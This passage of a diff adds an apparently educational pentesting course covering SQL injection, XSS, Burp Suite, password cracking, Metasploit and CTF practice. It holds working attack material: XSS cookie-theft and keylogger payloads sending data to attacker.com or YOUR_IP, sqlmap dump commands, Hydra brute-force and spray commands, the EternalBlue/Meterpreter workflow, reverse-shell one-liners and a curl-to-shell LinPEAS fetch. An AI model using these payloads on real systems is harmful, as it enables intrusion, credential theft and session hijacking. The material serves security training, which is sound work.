+    The simple defenses that would have prevented everything: parameterized queries + WAF + patching Struts (which had been available 2 months earlier). Cost of negligence: $575M FTC settlement, +$1.4B in security upgrades.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>
+
+<p class="prose">SQL injection testing starts manually and moves to automated only after confirming a vulnerability exists. Running sqlmap against every endpoint generates a lot of noise and can disrupt production.</p>
+
+<div class="section-title">Initial Manual Testing</div>
+<pre class="code-block"><code><span class="comment"># In every input field/parameter — try:</span>
+'                    <span class="comment"># single quote — error?</span>
+''                   <span class="comment"># escaped quote</span>
+1'--                 <span class="comment"># comment out the rest</span>
+1 OR 1=1             <span class="comment"># boolean test</span>
+1 AND SLEEP(5)       <span class="comment"># time-based test (waits 5 seconds?)</span>
+
+<span class="comment"># In URL parameters:</span>
+https://target.com/user?id=1'
+https://target.com/user?id=1 ORDER BY 10--
+<span class="comment"># "Unknown column '10'" → vulnerable, fewer than 10 columns</span>
+
+<span class="comment"># In Burp Suite — change param and watch the response</span>
+<span class="comment"># Error message = error-based SQLi</span>
+<span class="comment"># Changed response length = boolean-based</span>
+<span class="comment"># Response delay = time-based</span></code></pre>
+
+<div class="section-title">sqlmap — After Confirming Vulnerability</div>
+<pre class="code-block"><code><span class="comment"># Basic — confirms SQLi and shows databases</span>
+sqlmap -u "https://target.com/user?id=1" --dbs --batch
+
+<span class="comment"># With Burp intercept (save request to file)</span>
+<span class="comment"># Burp ← Save item ← req.txt</span>
+sqlmap -r req.txt --dbs --batch
+
+<span class="comment"># Dump users table</span>
+sqlmap -u "https://target.com/user?id=1" -D webapp -T users --dump --batch
+
+<span class="comment"># WAF blocking? Try evasion</span>
+sqlmap -u "https://target.com/user?id=1" --tamper=space2comment,between --dbs</code></pre>
+
+<div class="section-title">What to Include in the Report</div>
+<p class="prose">For every SQLi finding: full request (method, URL, headers, body), response that proves exploitation (error message, returned data), CVSS score, and remediation — parameterized queries with a code example in the relevant language.</p>`,
+`<div class="did-you-know">💡 <strong>Did you know?</strong> XSS is the most common vulnerability in web applications — according to HackerOne, 25% of all Bug Bounty reports are XSS. British Airways (2018) suffered from Stored XSS in a payment form planted by a Magecart skimming script — 500,000 customers, credit card details stolen, fine of £20M.</div>
+
+<div class="section-title">How XSS Works</div>
+<p class="prose">XSS (Cross-Site Scripting) lets an attacker inject JavaScript into a web page loaded in another victim's browser. The victim's browser runs the script as if it were a legitimate part of the site — because from the browser's perspective, it is. The difference from SQL Injection: SQLi attacks the database. XSS attacks the site's users.</p>
+
+<div class="section-title">The Three Types of XSS</div>
+<div class="grid-3">
+<div class="card"><div class="card-icon">↩️</div><div class="card-title">Reflected XSS</div><div class="card-body">Payload is sent in the URL, server reflects it in the response. Victim needs to click a malicious link. Not stored in DB. Example: <code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></div></div>
+<div class="card"><div class="card-icon">💾</div><div class="card-title">Stored XSS</div><div class="card-body">Payload is saved in the DB (comment, username, profile). Every user who sees the content runs the script. Most dangerous: no need to direct a victim to a link.</div></div>
+<div class="card"><div class="card-icon">🌐</div><div class="card-title">DOM XSS</div><div class="card-body">Client-side JavaScript reads a URL param and inserts it into the DOM without sanitization. Server never sees the payload. Cannot be detected in server logs. Browser executes directly.</div></div>
+</div>
+
+<div class="section-title">XSS — What You Can Do With It</div>
+<pre class="code-block"><code><span class="comment"># Cookie Theft — stealing sessions</span>
+&lt;script&gt;
+document.location='http://attacker.com/steal?c='+document.cookie
+&lt;/script&gt;
+<span class="comment"># every session cookie is sent to the attacker</span>
+
+<span class="comment"># Keylogger</span>
+&lt;script&gt;
+document.onkeypress = function(e) {
+  fetch('http://attacker.com/log?k='+e.key)
+}
+&lt;/script&gt;
+
+<span class="comment"># CSP bypass attempts</span>
+&lt;img src=x onerror=alert(1)&gt;       <span class="comment"># attribute injection</span>
+&lt;svg/onload=alert(1)&gt;              <span class="comment"># SVG vector</span></code></pre>
+
+<div class="section-title">Defenses — CSP and More</div>
+<p class="prose">Content Security Policy (CSP) is an HTTP header that restricts where scripts can run. <code>Content-Security-Policy: script-src 'self'</code> means: only scripts from our own domain. Inline scripts are blocked. Script from attacker.com — blocked. CSP is the best defense against XSS — but also the hardest to configure correctly.</p>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Samy Worm — XSS That Infected a Million Accounts in 20 Hours</div>
+  <div class="real-world-body">
+    2005: Samy Kamkar wrote an XSS worm on MySpace. The payload: (1) add Samy as a friend, (2) display "but most of all, samy is my hero" on the profile, (3) copy the payload to the current user's profile. Every visitor to an infected profile became infected.<br><br>
+    In 20 hours: one million accounts added Samy as a friend. MySpace was forced to shut down. Samy was arrested, receiving 3 years home confinement and 90 hours community service. Proof that Stored XSS is genuinely dangerous.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>
+
+<p class="prose">XSS testing requires checking every input point, including headers and JSON parameters that are not directly visible. Burp Scanner catches some — manual testing catches the rest.</p>
+
+<div class="section-title">XSS Payloads for Testing</div>
+<pre class="code-block"><code><span class="comment"># Simple — initial detection</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+<span class="comment"># If script tags are filtered</span>
+&lt;img src=x onerror="alert\`1\`"&gt;
+&lt;details open ontoggle=alert(1)&gt;
+javascript:alert(1)     <span class="comment"># in href attribute</span>
+
+<span class="comment"># DOM XSS — check URL fragment</span>
+https://target.com/search#&lt;img src=x onerror=alert(1)&gt;
+
+<span class="comment"># In JSON API (Content-Type: application/json)</span>
+{"name": "&lt;script&gt;alert(1)&lt;/script&gt;"}
+<span class="comment"># If response is rendered in HTML context — XSS</span></code></pre>
+
+<div class="section-title">Proof of Concept — Cookie Theft</div>
+<pre class="code-block"><code><span class="comment"># Setup listener (in lab/authorized environment)</span>
+<span class="comment"># 1. Start simple HTTP server:</span>
+python3 -m http.server 8080
+
+<span class="comment"># 2. XSS payload for cookie theft:</span>
+&lt;script&gt;
+new Image().src='http://YOUR_IP:8080/steal?c='+document.cookie;
+&lt;/script&gt;
+
+<span class="comment"># 3. When victim loads page — server log shows:</span>
+<span class="comment"># GET /steal?c=session=abc123; user=admin HTTP/1.1</span>
+
+<span class="comment"># PoC that proves impact without real harm</span>
+&lt;script&gt;alert('XSS by [your name] - Bug ID: 12345')&lt;/script&gt;
+<span class="comment"># A screenshot of this is sufficient for the report</span></code></pre>
+
+<div class="section-title">CSP Bypass Testing</div>
+<pre class="code-block"><code><span class="comment"># Check CSP header</span>
+curl -sI https://target.com | grep -i "content-security"
+<span class="comment"># Content-Security-Policy: script-src 'self' 'unsafe-inline'</span>
+<span class="comment"># 'unsafe-inline' = CSP does NOT protect against XSS!</span>
+
+<span class="comment"># CSP evaluator</span>
+<span class="comment"># https://csp-evaluator.withgoogle.com</span></code></pre>`,
+`<div class="did-you-know">💡 <strong>Did you know?</strong> Burp Suite Pro costs $449/year. Burp Suite Community (free) comes without Scanner and fast Intruder — but with full Proxy and Repeater. 80% of web pentest work is done in Repeater: capture request, modify, resend, see what happens.</div>
+
+<div class="section-title">Burp Suite Architecture</div>
+<p class="prose">Burp Suite is a proxy that sits between your browser and the internet. Your browser is configured to use 127.0.0.1:8080 as a proxy. Every HTTP/HTTPS request passes through Burp before reaching the server. Burp displays it, lets you modify it, and send it forward — or stop and analyze it. This gives you full control over all web traffic.</p>
+<p class="prose">For HTTPS: Burp installs its own CA certificate in the browser. The browser trusts Burp, Burp opens and closes TLS with the browser, and opens new TLS with the server. Intentional MiTM. The CA cert must be installed in the browser before you start.</p>
+
+<div class="section-title">The Key Modules</div>
+<pre class="code-block"><code><span class="comment"># 1. Proxy — Intercept</span>
+<span class="comment"># Every request stops until you click Forward</span>
+<span class="comment"># You can modify any header, param, cookie</span>
+
+<span class="comment"># 2. Repeater — send again and again</span>
+<span class="comment"># Send request to Repeater (Ctrl+R)</span>
+<span class="comment"># Change param: id=1 → id=2 → id=999</span>
+<span class="comment"># ← see different responses</span>
+<span class="comment"># This is the tool for manual manipulation of any vulnerability</span>
+
+<span class="comment"># 3. Intruder — automated Fuzzing</span>
+<span class="comment"># Mark position: username=§admin§&password=§test§</span>
+<span class="comment"># Load wordlist: rockyou.txt</span>
+<span class="comment"># Run — Burp sends every password from the list</span>
+<span class="comment"># Check response length/status to identify success</span>
+
+<span class="comment"># 4. Scanner (Pro) — auto-detect vulnerabilities</span>
+<span class="comment"># Active scan → finds SQLi, XSS, SSRF, IDOR, etc.</span>
+
+<span class="comment"># 5. Decoder — Encode/Decode</span>
+<span class="comment"># Base64, URL encoding, HTML encoding, hex</span>
+<span class="comment"># Very useful for JWT analysis</span></code></pre>
+
+<div class="section-title">IDOR — Insecure Direct Object Reference</div>
+<p class="prose">IDOR is a vulnerability where an API endpoint returns data by ID — without verifying that the user can access that ID. /api/user/123 returns user 123's profile. What happens if you send /api/user/124? If it returns another user's profile — that is IDOR. Repeater is the tool to test this.</p>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 IDOR on HackerOne — $10,000 Bug</div>
+  <div class="real-world-body">
+    Bug Bounty example: a researcher found IDOR in a private messages API. GET /api/messages?thread_id=12345 returned their messages. Change: thread_id=12344 — returned another user's messages. Iterate through IDs with Burp Intruder — every conversation on the platform was visible.<br><br>
+    The platform paid $10,000 for the bug. Fix: validate that the requesting user is a participant in the thread before granting access. IDOR is Broken Access Control — #1 in OWASP Top 10 2021.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>
+
+<p class="prose">Burp Suite is the central tool in web pentesting. Proxy + Repeater alone cover 80% of the work. Intruder and Scanner speed up the rest.</p>
+
+<div class="section-title">Proxy Setup</div>
+<pre class="code-block"><code><span class="comment"># Firefox — set proxy manually:</span>
+Settings ← Network Settings ← Manual proxy
+HTTP Proxy: 127.0.0.1  Port: 8080
+Check: "Use this proxy server for all protocols"
+
+<span class="comment"># Install Burp CA Certificate:</span>
+<span class="comment"># Browse to http://burp ← Download Certificate</span>
+<span class="comment"># Firefox: Settings ← Privacy ← View Certificates ← Import</span></code></pre>
+
+<div class="section-title">Repeater — Manual Testing</div>
+<pre class="code-block"><code><span class="comment"># Workflow for IDOR test:</span>
+<span class="comment"># 1. Proxy ← Intercept ← browse to /api/user/profile</span>
+<span class="comment"># 2. Request shown: GET /api/user/123 HTTP/2</span>
+<span class="comment"># 3. Ctrl+R ← send to Repeater</span>
+<span class="comment"># 4. Change: GET /api/user/124</span>
+<span class="comment"># 5. Send ← got another user's profile? ← IDOR!</span>
+
+<span class="comment"># Workflow for Auth bypass:</span>
+<span class="comment"># Request: GET /api/admin/users</span>
+<span class="comment"># Authorization: Bearer [token_of_regular_user]</span>
+<span class="comment"># Response 200 with admin data? ← Broken Access Control</span></code></pre>
+
+<div class="section-title">Intruder — Fuzzing and Brute Force</div>
+<pre class="code-block"><code><span class="comment"># Ctrl+I ← send request to Intruder</span>
+<span class="comment"># Mark the parameter to fuzz:</span>
+<span class="comment"># username=§admin§&password=§password§</span>
+
+<span class="comment"># Payload ← Simple list ← Load ← rockyou.txt</span>
+<span class="comment"># Attack type: Cluster bomb (every combination)</span>
+<span class="comment"># Start Attack</span>
+
+<span class="comment"># Identifying success:</span>
+<span class="comment"># Column: Length ← sort — different response = found!</span>
+<span class="comment"># Column: Status ← 302 Redirect = login success</span></code></pre>
+
+<div class="callout callout-tip"><strong>💡 Save everything:</strong> Burp ← Project ← Save project. Every request, every response, every note — saved in the project file. At the end of the engagement you have a complete artifact for your report.</div>`,
+`<div class="did-you-know">💡 <strong>Did you know?</strong> hashcat on an RTX 4090 can try 300 billion MD5 hashes per second. rockyou.txt contains 14 million passwords — checked in under a millisecond. An MD5 password hash of "password123" falls in microseconds. bcrypt with rounds=12 — 6 years on the same GPU. The choice of hashing algorithm is literally the difference between seconds and decades.</div>
+
+<div class="section-title">Hashing and Password Storage</div>
+<p class="prose">Passwords are not supposed to be stored as text — they are stored as a hash. When you log in, the system hashes the password you entered and compares it to the stored hash. The problem: hash functions like MD5 and SHA-1 are very fast — which is good for performance, bad for security. An attacker who stole the DB can run billions of guesses per second.</p>
+<pre class="code-block"><code><span class="comment"># MD5 — fast = dangerous for passwords</span>
+echo -n "password123" | md5sum
+<span class="comment"># ef92b778bafe771e... ← GPU: 300B hashes/sec</span>
+
+<span class="comment"># bcrypt — intentionally slow</span>
+<span class="comment"># rounds=12: 300ms per hash</span>
+<span class="comment"># brute force: only 3 hashes/sec</span>
+
+<span class="comment"># hashcat — GPU password cracking</span>
+hashcat -m 0 hash.txt rockyou.txt         <span class="comment"># MD5 + wordlist</span>
+hashcat -m 3200 hash.txt rockyou.txt      <span class="comment"># bcrypt</span>
+hashcat -m 1000 hash.txt rockyou.txt      <span class="comment"># NTLM (Windows)</span>
+hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule  <span class="comment"># with rules</span>
+
+<span class="comment"># Rules — variations on wordlist</span>
+<span class="comment"># "password" → Password, PASSWORD, passw0rd, p@ssword...</span>
+<span class="comment"># Increases coverage 10,000x at no memory cost</span></code></pre>
+
+<div class="section-title">Online Brute Force — Hydra</div>
+<pre class="code-block"><code><span class="comment"># Hydra — online brute force (authorized only!)</span>
+hydra -l admin -P rockyou.txt ssh://192.168.1.100
+hydra -l admin -P rockyou.txt ftp://192.168.1.100
+
+<span class="comment"># Web form brute force</span>
+hydra -l admin -P rockyou.txt   http-post-form "http://target/login:user=^USER^&pass=^PASS^:Login failed"
+
+<span class="comment"># Rate limiting — control threads</span>
+hydra -l admin -P rockyou.txt -t 4 ssh://target  <span class="comment"># 4 threads</span></code></pre>
+
+<div class="section-title">Credential Stuffing</div>
+<p class="prose">Credential Stuffing is different from brute force: instead of guessing passwords, it uses real leaked credentials. Have I Been Pwned (haveibeenpwned.com) contains over 12 billion records from breaches. If a user uses the same password on Netflix and Gmail — and Netflix was breached — the attacker tries Gmail with the same credentials.</p>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 RockYou2024 — 10 Billion Passwords</div>
+  <div class="real-world-body">
+    July 2024: a file named "rockyou2024.txt" was uploaded to hacker forums with 9.9 billion unique passwords — a compilation of every leak over 20 years. These are not encrypted — they are plaintext passwords from LinkedIn, Adobe, Dropbox, and thousands of other breached services.<br><br>
+    The takeaway: password reuse is deadly. One of these passwords is probably yours. Credential stuffing with this file equals immediate compromise of any account that reuses it. Fix: password manager + unique password per site + MFA.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>
+
+<p class="prose">Password attacks in a pentest fall into two categories: offline cracking (you have a hash — crack it) and online brute force (login interface — try passwords). Each requires a completely different approach.</p>
+
+<div class="section-title">Offline Hash Cracking</div>
+<pre class="code-block"><code><span class="comment"># Step 1: Identify hash type</span>
+hash-identifier           <span class="comment"># interactive</span>
+hashid "5f4dcc3b5aa765d61d8327deb882cf99"
+<span class="comment"># MD5</span>
+
+<span class="comment"># Step 2: hashcat</span>
+<span class="comment"># MD5 (-m 0)</span>
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># bcrypt (-m 3200) — very slow, use short wordlist only</span>
+hashcat -m 3200 hashes.txt 100_common_passwords.txt
+
+<span class="comment"># NTLM (Windows, -m 1000)</span>
+hashcat -m 1000 hashes.txt rockyou.txt
+
+<span class="comment"># With rules — significantly increases coverage</span>
+hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+<span class="comment"># See cracked results</span>
+hashcat -m 0 hashes.txt --show</code></pre>
+
+<div class="section-title">Online Brute Force — Carefully</div>
+<pre class="code-block"><code><span class="comment"># Hydra — authorized targets only!</span>
+<span class="comment"># SSH</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://target_ip
+<span class="comment"># -t 4 = 4 threads (do not raise — causes lockout!)</span>
+
+<span class="comment"># Web login form</span>
+hydra -l admin@target.com -P passwords.txt target.com   http-post-form "/login:email=^USER^&password=^PASS^:Invalid credentials"   -t 2 -W 3
+<span class="comment"># -W 3 = wait 3 seconds between tries</span>
+
+<span class="comment"># Password Spray — better than brute force</span>
+<span class="comment"># 1 common password × all usernames (does not trigger lockout)</span>
+hydra -L usernames.txt -p "Winter2025!" ssh://target_ip -t 1</code></pre>
+
+<div class="section-title">Default Credentials</div>
+<p class="prose">Before brute force — always try default credentials. Shodan shows tens of thousands of devices with admin/admin. Useful resource: cirt.net/passwords — a database of default credentials by vendor and device.</p>`,
+`<div class="did-you-know">💡 <strong>Did you know?</strong> Metasploit Framework was created in 2003 in Perl by HD Moore, migrated to Ruby in 2007, and acquired by Rapid7 in 2009. Today it contains 2,100+ exploits, 592 payloads, and 350+ auxiliary modules. EternalBlue (MS17-010) — the exploit that spread WannaCry — is available in Metasploit. This also means every sysadmin can check whether their network is vulnerable.</div>
+
+<div class="section-title">Metasploit Architecture</div>
+<p class="prose">Metasploit Framework consists of several module types: Exploits (code that leverages a vulnerability), Payloads (what runs after the breach — reverse shell, Meterpreter), Auxiliary (scanning, fuzzing, brute force without exploitation), Post (actions after gaining access), and Encoders (to hide payloads from AV). Everything is accessible through msfconsole — the central CLI.</p>
+<pre class="code-block"><code><span class="comment"># msfconsole basics</span>
+msfconsole -q              <span class="comment"># open without banner</span>
+help                       <span class="comment"># list commands</span>
+search eternalblue         <span class="comment"># find exploit</span>
+use exploit/windows/smb/ms17_010_eternalblue
+info                       <span class="comment"># full info on module</span>
+show options               <span class="comment"># what params are needed</span>
+set RHOSTS 192.168.1.100  <span class="comment"># target IP</span>
+set LHOST 192.168.1.50    <span class="comment"># attacker IP (our machine)</span>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run                        <span class="comment"># execute</span></code></pre>
+
+<div class="section-title">Meterpreter — Advanced Payload</div>
+<p class="prose">Meterpreter is an advanced payload that runs in memory — not written to disk, harder for antivirus to detect. It provides a range of capabilities directly: filesystem access, process injection, privilege escalation, network pivoting. When you have a Meterpreter session — you have full control of the machine.</p>
+<pre class="code-block"><code><span class="comment"># Meterpreter commands</span>
+sysinfo             <span class="comment"># OS, computer name, domain</span>
+getuid              <span class="comment"># who are we? (user, SYSTEM)</span>
+ps                  <span class="comment"># list processes</span>
+migrate PID         <span class="comment"># inject into another process</span>
+getsystem           <span class="comment"># try privilege escalation</span>
+
+<span class="comment"># Filesystem</span>
+ls / dir            <span class="comment"># list files</span>
+download secret.txt ./   <span class="comment"># download file</span>
+upload backdoor.exe C:\\  <span class="comment"># upload file</span>
+
+<span class="comment"># Post modules</span>
+run post/windows/gather/credentials/credential_collector
+run post/multi/manage/shell_to_meterpreter</code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 EternalBlue — The NSA Exploit Released to the World</div>
+  <div class="real-world-body">
+    EternalBlue (MS17-010) was an NSA exploit for an SMB vulnerability in Windows. In 2017 the Shadow Brokers group stole and published a collection of NSA exploits. A month later: WannaCry ransomware and NotPetya used EternalBlue to sweep entire networks in auto-propagating worm attacks.<br><br>
+    Metasploit added EternalBlue as a module. Since then: every pentester checks for it. And every attacker. The patch was available a month before WannaCry — but NHS, FedEx, Renault did not update. Patch management is prevention, not a nice-to-have.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>
+
+<p class="prose">Metasploit is most useful when used in an organized way: a workspace per engagement, import of nmap scans, and documentation of every session.</p>
+
+<div class="section-title">Workspace Setup</div>
+<pre class="code-block"><code><span class="comment"># Create workspace for engagement</span>
+msfconsole -q
+workspace -a client_2025_01
+workspace   <span class="comment"># list workspaces</span>
+
+<span class="comment"># Import nmap XML scan</span>
+db_import scans/initial_scan.xml
+hosts       <span class="comment"># list discovered hosts</span>
+services    <span class="comment"># list services</span>
+
+<span class="comment"># Search exploits by service</span>
+search type:exploit name:smb
+search cve:2021-44228   <span class="comment"># Log4Shell</span>
+search platform:windows type:exploit rank:excellent</code></pre>
+
+<div class="section-title">Exploit Workflow</div>
+<pre class="code-block"><code><span class="comment"># Example: EternalBlue (MS17-010)</span>
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+check   <span class="comment"># is target vulnerable? (not always reliable)</span>
+run
+
+<span class="comment"># After Meterpreter session:</span>
+sysinfo        <span class="comment"># what is the machine?</span>
+getuid         <span class="comment"># who are we?</span>
+getsystem      <span class="comment"># try privilege escalation</span>
+run post/multi/recon/local_exploit_suggester
+
+<span class="comment"># PoC screenshot for report</span>
+screenshot
+
+<span class="comment"># Document session</span>
+sessions -l    <span class="comment"># list sessions</span>
+sessions -i 1  <span class="comment"># return to session</span></code></pre>
+
+<div class="callout callout-warn"><strong>⚠️ Important:</strong> Always note before exploitation: timestamp, target IP, exploit used, and what happened. If something breaks — the log is what protects you and allows the client to do a rollback.</div>`,
+`<div class="did-you-know">💡 <strong>Did you know?</strong> HackTheBox contains over 500 machines to hack. Every machine contains user.txt and root.txt — flags that prove you gained access. The best users rank as "Pro Hacker" and "Elite Hacker." Companies like Google, Microsoft, and Apple recruit directly from the HackTheBox leaderboard. This is literally the career path.</div>
+
+<div class="section-title">What is CTF and Why Play?</div>
+<p class="prose">CTF (Capture The Flag) is a competition where participants solve security challenges: web exploitation, binary exploitation, cryptography, forensics, and reverse engineering. Each challenge ends with a flag — a string in the format CTF{...}. CTFs are the most legitimate and enjoyable way to practice pentesting skills — because the systems are designed to be hacked.</p>
+<p class="prose">The difference between CTF and real pentesting: CTF is a controlled environment designed to be broken. A real pentest is an assessment of production systems with a defined scope. But the skills are identical — and CTF gives you a place to learn without worrying about legal implications.</p>
+
+<div class="section-title">Platforms to Practice</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>Platform</th><th>Type</th><th>Difficulty</th><th>Free?</th></tr></thead><tbody>
+<tr><td><strong>HackTheBox</strong></td><td>Machines + Challenges</td><td>Medium-Hard</td><td>Partially</td></tr>
+<tr><td><strong>TryHackMe</strong></td><td>Guided rooms, learning paths</td><td>Beginner-Medium</td><td>Partially</td></tr>
+<tr><td><strong>VulnHub</strong></td><td>VM downloads</td><td>All levels</td><td>✅ Free</td></tr>
+<tr><td><strong>PicoCTF</strong></td><td>Educational CTF</td><td>Beginner</td><td>✅ Free</td></tr>
+<tr><td><strong>CTFtime.org</strong></td><td>CTF calendar</td><td>All levels</td><td>✅ Free</td></tr>
+</tbody></table></div>
+
+<div class="section-title">CTF Methodology — How to Approach</div>
+<p class="prose">There is no single "correct" way, but there is a framework that helps. Every challenge starts with reconnaissance: what is there? What is visible? What is the technology stack? Only after understanding the surface area do you start trying vectors.</p>
+<pre class="code-block"><code><span class="comment"># Web Challenge checklist</span>
+1. Source code (Ctrl+U) — comments? hidden fields?
+2. robots.txt, sitemap.xml — hidden paths?
+3. /admin, /backup, /.git — common directories
+4. Cookies — JWT? base64? manipulable?
+5. Parameters — SQLi, XSS, IDOR, SSRF?
+6. Headers — Server version? X-Powered-By?
+
+<span class="comment"># Reverse shell one-liner (lab only!)</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+
+<span class="comment"># Netcat listener</span>
+nc -lvnp 4444   <span class="comment"># waiting for connection</span>
+
+<span class="comment"># Stabilize shell</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 From CTF to Career — The Real Path</div>
+  <div class="real-world-body">
+    Marcus Hutchins (@MalwareTechBlog) — the person who stopped WannaCry in 2017 by registering a typosquatting domain — started with CTFs as a teenager. At age 22 he identified the WannaCry killswitch in 15 minutes.<br><br>
+    The standard path: CTF beginner (picoCTF, TryHackMe) → CTF intermediate (HackTheBox Easy) → OSCP certification → Junior Penetration Tester. Junior Pentester salary in Israel: 15,000-25,000 NIS/month. Senior: 30,000-50,000+. High demand, low supply.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>
+
+<p class="prose">The fastest way to start: TryHackMe is the top choice for beginners, HackTheBox for intermediate. Both provide guided labs that teach real tools on real machines.</p>
+
+<div class="section-title">HackTheBox — First Machine</div>
+<pre class="code-block"><code><span class="comment"># 1. Download .ovpn and connect</span>
+sudo openvpn ~/Downloads/lab_username.ovpn
+
+<span class="comment"># 2. Verify connected</span>
+ping 10.10.10.1   <span class="comment"># HTB network</span>
+
+<span class="comment"># 3. Choose an easy/retired machine</span>
+<span class="comment"># Retired machines have writeups — excellent for learning</span>
+
+<span class="comment"># 4. Initial recon always</span>
+sudo nmap -sV -sC -oA scans/machine_name TARGET_IP
+cat scans/machine_name.nmap | grep "open"
+
+<span class="comment"># 5. Web? Browse to http://TARGET_IP</span>
+<span class="comment"># gobuster, nikto, whatweb</span>
+
+<span class="comment"># 6. SSH/FTP open? Try anonymous</span>
+ssh root@TARGET_IP
+ftp TARGET_IP        <span class="comment"># anonymous login?</span></code></pre>
+
+<div class="section-title">Reverse Shell — Essential for CTF</div>
+<pre class="code-block"><code><span class="comment"># Your listener (Kali machine)</span>
+nc -lvnp 4444
+
+<span class="comment"># Payloads to send to target:</span>
+<span class="comment"># Bash</span>
+bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1
+
+<span class="comment"># Python3</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+
+<span class="comment"># revshells.com ← generator for every language</span>
+
+<span class="comment"># Stabilize shell after receiving:</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm</code></pre>
+
+<div class="section-title">Privilege Escalation — Quick Wins</div>
+<pre class="code-block"><code><span class="comment"># Always run first:</span>
+sudo -l           <span class="comment"># what is allowed without password?</span>
+find / -perm -4000 -type f 2>/dev/null  <span class="comment"># SUID files</span>
+cat /etc/crontab  <span class="comment"># cron jobs</span>
+
+<span class="comment"># LinPEAS — most comprehensive</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="comment"># GTFOBins — exploit SUID/sudo</span>
+<span class="comment"># https://gtfobins.github.io</span>
+<span class="comment"># Search the binary name you found — shows exactly how to exploit</span></code></pre>
+
+<div class="callout callout-tip"><strong>💡 Stuck?</strong> Try 30 more minutes in a new direction before looking at the writeup. CTF skills are built through frustration. After reading a writeup — reproduce it yourself on the same machine, do not just read it.</div>`
+  ],
+  cheat:[
+`<div class="callout callout-success"><strong>📋 Kali Linux — The Environment</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Debian</span></div><div class="cheat-item"><span class="cheat-key">pentesting only</span></div><div class="cheat-item"><span class="cheat-key">14M+ passwords</span></div><div class="cheat-item"><span class="cheat-key">Metasploit database</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 Reconnaissance — Target Mapping</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Passive=no packets sent</span></div><div class="cheat-item"><span class="cheat-key">specific domain</span></div><div class="cheat-item"><span class="cheat-key">internet-connected devices</span></div><div class="cheat-item"><span class="cheat-key">all 65535 ports</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 SQL Injection — How and Why</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">input not sanitized in query</span></div><div class="cheat-item"><span class="cheat-key">query to return all records</span></div><div class="cheat-item"><span class="cheat-key">separates SQL from data</span></div><div class="cheat-item"><span class="cheat-key">SLEEP()</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 XSS — Cross-Site Scripting</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">victim does not need to click link</span></div><div class="cheat-item"><span class="cheat-key">server does not see the payload</span></div><div class="cheat-item"><span class="cheat-key">Content Security Policy</span></div><div class="cheat-item"><span class="cheat-key">session cookies</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 Burp Suite — Web Testing</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">8080</span></div><div class="cheat-item"><span class="cheat-key">manually sending and resending requests</span></div><div class="cheat-item"><span class="cheat-key">automated fuzzing/brute force</span></div><div class="cheat-item"><span class="cheat-key">Insecure Direct Object Reference</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 Password Attacks — Cracking Passwords</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">intentionally slow</span></div><div class="cheat-item"><span class="cheat-key">MD5</span></div><div class="cheat-item"><span class="cheat-key">variations on wordlist words</span></div><div class="cheat-item"><span class="cheat-key">leaked username:password pairs</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 Metasploit — Exploitation Framework</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">2003</span></div><div class="cheat-item"><span class="cheat-key">in memory only</span></div><div class="cheat-item"><span class="cheat-key">target IP</span></div><div class="cheat-item"><span class="cheat-key">attacker listening IP</span></div></div></div>`,
